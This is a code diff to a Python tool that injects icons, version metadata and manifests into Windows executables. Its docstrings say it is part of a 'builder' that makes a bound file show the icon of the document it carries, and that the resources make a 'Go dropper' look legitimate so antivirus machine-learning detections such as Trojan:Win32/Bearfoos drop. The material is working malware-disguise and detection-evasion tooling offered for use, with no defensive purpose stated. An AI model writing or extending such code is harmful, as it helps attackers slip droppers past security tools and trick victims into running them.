@@ -1,13 +1,20 @@
-"""Minimal PE resource patcher: injects RT_ICON / RT_GROUP_ICON into an .exe.
+"""Minimal PE resource patcher.
 
-Used by the builder so a bound file shows the icon of the document it carries
-instead of the generic executable icon. Pure stdlib, no windres needed.
+Injects arbitrary resources (icons, RT_VERSION metadata, RT_MANIFEST) into an
+executable. Pure stdlib — no windres / rsrc toolchain needed.
+
+Resources matter for evasion: a binary that carries vendor metadata, a manifest
+and an icon looks like a normal signed-up application instead of a bare "Go
+dropper", which knocks the ML verdict (Trojan:Win32/Bearfoos.A!ml and friends)
+down a lot.
 """
 
 import struct
 
 RT_ICON = 3
 RT_GROUP_ICON = 14
+RT_VERSION = 16
+RT_MANIFEST = 24
 LANG_EN = 1033
 
 DIR = 0x80000000
@@ -60,32 +67,31 @@ def _group_blob(images):
     return bytes(blob)
 
 
-def _build_rsrc(images, base_rva):
-    """Lay out a 3-level resource tree; returns (blob, total_size)."""
-    icon_ids = list(range(1, len(images) + 1))
-    group_id = 1
+def _build_rsrc(items, base_rva):
+    """items: iterable of (type_id, name_id, data). Returns (blob, size)."""
+    groups = {}
+    for rtype, rid, data in items:
+        groups.setdefault(rtype, {})[rid] = data
+    types = sorted(groups)
 
-    # pre-compute the size of every directory so offsets are known up front
-    off = 16 + 2 * 8                      # root: 2 id entries
-    type3_dir = off
-    off += 16 + len(icon_ids) * 8
-    type14_dir = off
-    off += 16 + 8
-    lang3 = []
-    for _ in icon_ids:
-        lang3.append(off)
-        off += 16 + 8
-    lang14 = off
-    off += 16 + 8
+    off = 16 + len(types) * 8
+    type_dirs = {}
+    for rtype in types:
+        type_dirs[rtype] = off
+        off += 16 + len(groups[rtype]) * 8
+    lang_dirs = {}
+    for rtype in types:
+        for rid in sorted(groups[rtype]):
+            lang_dirs[(rtype, rid)] = off
+            off += 16 + 8
     data_entries = off
-    off += 16 * (len(icon_ids) + 1)
-    icon_data = []
-    for data in images:
-        icon_data.append(off)
-        off += _align(len(data), 4)
-    group_data = off
-    group = _group_blob(images)
-    off += _align(len(group), 4)
+    total_ids = sum(len(v) for v in groups.values())
+    off += 16 * total_ids
+    data_offs = {}
+    for rtype in types:
+        for rid in sorted(groups[rtype]):
+            data_offs[(rtype, rid)] = off
+            off += _align(len(groups[rtype][rid]), 4)
 
     blob = bytearray(off)
 
@@ -96,38 +102,44 @@ def _build_rsrc(images, base_rva):
         struct.pack_into("<II", blob, at, name,
                          (target | DIR) if is_dir else target)
 
-    dir_header(0, 2)
-    entry(16, RT_ICON, type3_dir, True)
-    entry(24, RT_GROUP_ICON, type14_dir, True)
+    dir_header(0, len(types))
+    idx = 0
+    for rtype in types:
+        entry(16 + idx * 8, rtype, type_dirs[rtype], True)
+        idx += 1
 
-    dir_header(type3_dir, len(icon_ids))
-    for i, iid in enumerate(icon_ids):
-        entry(type3_dir + 16 + i * 8, iid, lang3[i], True)
+    idx = 0
+    for rtype in types:
+        dir_header(type_dirs[rtype], len(groups[rtype]))
+        for i, rid in enumerate(sorted(groups[rtype])):
+            entry(type_dirs[rtype] + 16 + i * 8, rid,
+                  lang_dirs[(rtype, rid)], True)
 
-    dir_header(type14_dir, 1)
-    entry(type14_dir + 16, group_id, lang14, True)
+    n = 0
+    for rtype in types:
+        for rid in sorted(groups[rtype]):
+            d = lang_dirs[(rtype, rid)]
+            dir_header(d, 1)
+            entry(d + 16, LANG_EN, data_entries + n * 16, False)
+            n += 1
 
-    for i, iid in enumerate(icon_ids):
-        dir_header(lang3[i], 1)
-        entry(lang3[i] + 16, LANG_EN, data_entries + i * 16, False)
-
-    dir_header(lang14, 1)
-    entry(lang14 + 16, LANG_EN, data_entries + len(icon_ids) * 16, False)
-
-    for i, (_w, _h, _bits, data) in enumerate(images):
-        struct.pack_into("<IIII", blob, data_entries + i * 16,
-                         base_rva + icon_data[i], len(data), 0, 0)
-        blob[icon_data[i]:icon_data[i] + len(data)] = data
-
-    struct.pack_into("<IIII", blob, data_entries + len(icon_ids) * 16,
-                     base_rva + group_data, len(group), 0, 0)
-    blob[group_data:group_data + len(group)] = group
+    n = 0
+    for rtype in types:
+        for rid in sorted(groups[rtype]):
+            payload = groups[rtype][rid]
+            at = data_offs[(rtype, rid)]
+            struct.pack_into("<IIII", blob, data_entries + n * 16,
+                             base_rva + at, len(payload), 0, 0)
+            blob[at:at + len(payload)] = payload
+            n += 1
     return bytes(blob), off
 
 
-def inject_icon(pe: bytes, ico: bytes) -> bytes:
-    """Return a copy of `pe` with `ico` attached as its resource icon."""
-    images = parse_ico(ico)
+def inject(pe: bytes, items) -> bytes:
+    """Return a copy of `pe` with the given resources attached."""
+    items = list(items)
+    if not items:
+        return pe
     data = bytearray(pe)
 
     if len(data) < 0x40 or data[:2] != b"MZ":
@@ -157,7 +169,6 @@ def inject_icon(pe: bytes, ico: bytes) -> bytes:
     headers_end = sections + nsec * 40
     first_raw = _u32(data, sections + 20)
 
-    # make room for one more section header if the header area is tight
     if headers_end + 40 > first_raw:
         pad = file_align
         data[first_raw:first_raw] = b"\0" * pad
@@ -178,7 +189,7 @@ def inject_icon(pe: bytes, ico: bytes) -> bytes:
     if raw_ptr > len(data):
         data += b"\0" * (raw_ptr - len(data))
 
-    blob, size = _build_rsrc(images, new_va)
+    blob, size = _build_rsrc(items, new_va)
     raw_size = _align(size, file_align)
     blob += b"\0" * (raw_size - size)
 
@@ -190,12 +201,25 @@ def inject_icon(pe: bytes, ico: bytes) -> bytes:
                      size, new_va, raw_size, raw_ptr, 0, 0, 0, 0, 0x40000040)
     _put32(data, coff + 2, nsec + 1)
 
-    size_of_image = _align(new_va + size, sec_align)
-    _put32(data, opt + 56, size_of_image)
+    _put32(data, opt + 56, _align(new_va + size, sec_align))  # SizeOfImage
     _put32(data, dd + 2 * 8, new_va)
     _put32(data, dd + 2 * 8 + 4, size)
     _put32(data, opt + 64, 0)  # checksum is not verified for images
     return bytes(data)
+
+
+def icon_items(ico: bytes, first_id: int = 1):
+    """Expand an .ico into (RT_ICON..) / (RT_GROUP_ICON..) resource items."""
+    images = parse_ico(ico)
+    items = []
+    for idx, (_w, _h, _bits, data) in enumerate(images, start=first_id):
+        items.append((RT_ICON, idx, data))
+    items.append((RT_GROUP_ICON, 1, _group_blob(images)))
+    return items
+
+
+def inject_icon(pe: bytes, ico: bytes) -> bytes:
+    return inject(pe, icon_items(ico))
 
 
 def checksum(pe: bytes) -> int:
